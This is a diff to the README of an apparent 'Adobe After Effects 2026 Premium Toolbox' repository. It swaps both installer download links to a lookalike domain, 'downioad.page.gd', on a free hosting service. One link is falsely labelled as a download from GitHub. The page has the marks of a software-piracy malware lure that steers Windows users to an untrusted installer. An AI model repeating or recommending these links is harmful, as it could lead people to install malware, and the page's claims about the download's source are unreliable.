@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive toolbox for Adobe After Effects 2026, designed to enhance your creative workflow with advanced presets, plugins, and management tools. It is optimized for Windows desktop users seeking to elevate their motion graphics and visual effects projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ For support, you can open an issue on this GitHub repository. Our team monitors 
 
 To get the latest version of the Adobe After Effects 2026 Premium Toolbox, use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Support and Updates
 
